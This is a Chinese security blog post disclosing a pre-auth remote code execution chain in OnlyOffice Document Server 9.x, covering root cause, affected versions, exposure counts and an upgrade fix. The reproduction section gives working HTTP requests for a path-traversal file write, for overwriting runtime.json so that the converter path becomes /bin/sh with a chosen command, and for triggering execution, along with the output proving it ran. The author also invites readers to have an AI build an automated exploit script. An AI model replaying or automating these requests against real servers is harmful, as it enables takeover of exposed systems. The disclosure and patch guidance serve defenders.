#  【大洞速修】OnlyOffice 前台 RCE 漏洞！  
原创 ChinaRan404
                    ChinaRan404  知攻善防实验室   2026-10-10 04:22  
  
   
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXF7QRbe2DAhlicDlV32Y8ymkAM6H81CpcIVU0cia2gmMJu0597z7y4gUHm9JVic77wJPIiaB20ErDXnCHByzt9kC0YX3zsA0ma2158/640?wx_fmt=gif&from=appmsg "")  
  
前言  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXFP4ibIZEdibfZfiayEOt9iaOFSRS5bSCU08fMnTwB0doecdCqic44YNx8OaLL66sssGHtJ0LYeFyvMbFapeKBtORO9icuIicMiaXiaNd8A/640?wx_fmt=gif&from=appmsg "")  
  
  
经常打攻防的师傅应该经常遇见这个系统，还有很多闭源系统调用了它，所以我觉得这个洞危害还是挺大的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/a3etiafIAYXGtYFQWiakKd37kVXibtKJmtmy246tE2VQJzbnich9cGF8lLrPPsiaVE1ZF8YsUtm8KSF7Fy96HyTeiaLbibVwN7QxTGWJIv1vZoS4Bg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXEtyxSUT8iayHC7qANUKkazs74dZ8Mnddq1e7eJVwulrIeCQD6yILB8AqibduX935CQZgV5icGhnzkxHibUcvIaCeLjZsSn5PibZ4UQ/640?wx_fmt=gif&from=appmsg "")  
  
漏洞简介  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXHB6jMP48R7fbr8S0ialiapBcDEGCk40cO2arS0iaa3eQ2Jv1hG2ZLXiaicbqibwhAToLs0F8axBRm0TEhUQnIvNnllqX3OLG1k7Zjo0/640?wx_fmt=gif&from=appmsg "")  
  
  
OnlyOffice Document Server 存在  
路径穿越与  
配置注入叠加导致的远程代码执行漏洞（CNVD-2026-28199，严重级别）。  
  
1.路径穿越 → 任意目录写文件  
  
DocService/sources/canvasservice.js` 的 `saveParts()` 将客户端可控的 `savekey` 直接拼接进存储路径：    
```
 yield storage.putObject(ctx, cmd.getSaveKey() + '/' + filename, buffer, buffer.length);
```  
  
 Common/sources/storage/storage-fs.js的getFilePath()直接 path.join(folderPath, strPath)，未过滤 `..`；`format` 参数亦拼入文件名 `"Editor." + format`，同样可控。`id` 在 FileConverter 侧作为存储 key（`key = cmd.savekey ? cmd.savekey : cmd.id`）进入文件路径，同样受影响 —— 与官方排查建议"对 savekey / format / id 禁止 .. 与绝对路径"完全对应。  
  
2.  
配置注入 → 无授权覆写运行时配置  
  
9.0 版本引入管理端点 `POST /info/config`，可将请求体（任意完整 JSON）写入运行时配置文件 **`/var/www/onlyoffice/Data/runtime.json`**。应用层无任何认证（`utils.checkClientIp` 在默认配置 `ipfilter.useforrequest=false` 时直接放行，不校验 JWT）；唯一限制是 nginx 默认对 `/info` 做 `allow 127.0.0.1` 限制（官方配置注释明确说明可注释掉以对外开启 info 页面；直连 8000 端口、反代转发 `/info` 的部署均可远程触发）。  
  
  
RCE 叠加原理： FileConverter 每次转换任务都会通过 `ctx.getCfg('FileConverter.converter.x2tPath')` 读取配置并 `spawnProcess()` 启动外部程序。攻击者通过配置注入将 `FileConverter.converter.x2tPath` 改为 `/bin/sh`、`args` 改为待执行命令，converter 重启加载新配置后（supervisord `autorestart=true`，且进程可被攻击者触发崩溃），任意一次转换即以 `ds` 用户执行任意命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXEXsibWicpoNkIdJR7x1TATzusSCGFia7aPgausbGJCxrsfSLphIZf4MI21RkibJp3ibVsg6OHYtXchmEqEibkMvLYczfGtstBy1QnE0/640?wx_fmt=gif&from=appmsg "")  
  
漏洞影响  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXH5ljhOXrI6LXR6v4swtjTK8nUX3iaq50viaqbcBH3VvCJqc9bSLKiblBxUYO4z7Ub4QDAAuiba1uic4J2HNxUXLXuJO77ksTX13O9U/640?wx_fmt=gif&from=appmsg "")  
  
  
ONLYOFFICE Document Server（Docker-DocumentServer）  
  
5.0 以上；9.x 版本可即时触发（`/info/config` 为 9.0 引入），其余版本可被动触发  
  
onlyoffice/documentserver:9.0.0`（Build 168，2025-06-17 构建），确认存在  
  
app:"onlyoffice" 全球约 19.7 万条 / 7.0 万独立 IP；国内约 8.4 万条 / 3.0 万独立 IP   
  
![]( "")  
  
复现过程  
  
![]( "")  
  
  
环境：本地隔离 Docker，`docker run -d --name oods -p 9880:80 -e JWT_ENABLED=false onlyoffice/documentserver:9.0.0`。  
  
步骤 1：验证路径穿越任意写文件  
```
POST /downloadas/normal?cmd={"c":"save","id":"probe","format":"txt",
                            "savekey":"../../../../../../tmp/pwn_write"} HTTP/1.1
Content-Type: application/octet-stream
<任意文件内容>
```  
  
响应 {"type":"save","status":"ok",...}服务器上实际落盘 /tmp/pwn_write/Editor1.txt`，内容为请求体 —— 任意目录写文件成立  
```
（存储根为 /var/lib/onlyoffice/documentserver/App_Data/cache/files/data`..` 直接逃逸）。
```  
  
步骤 2：配置注入，覆写 runtime.json  
```
POST /info/config HTTP/1.1
Content-Type: application/octet-stream
{ ...完整 JSON 配置，其中注入：...
  "FileConverter": {"converter": {
      "x2tPath": "/bin/sh",
      "args": "-c id>/tmp/pwned_rce_config_injection"
  }}
}
```  
  
返回 200，/var/www/onlyoffice/Data/runtime.json 被覆写（属主 `ds` 可写），注入内容已确认写入文件。  
  
步骤 3：配置生效（无需服务端人工干预）  
  
两种生效方式均已实测：  
  
热加载（无需重启）：converter 的 runtimeConfigManager`配置缓存 TTL 到期后自动读取被注入的 runtime.json，实测约 85 秒内生效；  
  
重启生效：supervisord autorestart=true，进程崩溃（攻击者可诱发）/容器重启即自动加载新配置（对应"其余版本可被动触发"）。  
  
  
步骤 4：触发转换，执行任意命令（RCE 实锤）  
```
POST /downloadas/normal?cmd={"c":"save","id":"rce10","savekey":"rce10",
                            "format":"docx","savetype":2} HTTP/1.1
dummy
```  
  
converter 从队列取出任务后执行 `spawn("/bin/sh", ["-c", "id>/tmp/pwned_rce_config_injection", params.xml])`。查看结果文件：  
```
$ cat /tmp/pwned_rce_config_injection
uid=105(ds) gid=107(ds) groups=107(ds)
```  
  
命令执行成功，（首次验证时载荷 `touch` 因参数切分报 `touch: missing file operand`，该报错出现在 converter 日志中，同样独立证明了 shell 被执行。）  
  
环境恢复  
  
还原 runtime.json 中 `x2tPath`/`args` 为原值，重启 docservice 与 converter，healthcheck 恢复 200，清理全部测试产物。  
  
影响巨大，而且可能会影响业务，这里一键梭哈脚本就不发了，有兴趣可以给 AI 自动化梭哈一下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a3etiafIAYXEVia8YjC1iahKbhK83ShWS5UAmmx1AVkhKEnzMeGahCUu6W5CRl5GK3EwfPbcO3YAAibUKLHRNJXd0hqsNsA1Z5GLOx827Ro10wc/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXFvvhF2udqxuKia1OT5dQX8bRRlySAosWZhcicngeC82kW0OHqtu2x8nZdqu2FP10UphAHs4uCw3AOZ6Fxm9Xnwc40HE96SxLLBU/640?wx_fmt=gif&from=appmsg "")  
  
修复方式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXHHwTkvIbnCs1LW5FbGT3xB0IHrWxmvSPGEsiaA8vjdLLY3EaZnR633qxcZzlG6GfPN3ic7wqXKAZ88MPiaKzACx5qtec9YhRx4t0/640?wx_fmt=gif&from=appmsg "")  
  
  
升级至 ONLYOFFICE Document Server 9.1.0 或更高版本（含 saveKey 路径穿越修复 `0892841` 及 `/info/config` 修复）  
  
  
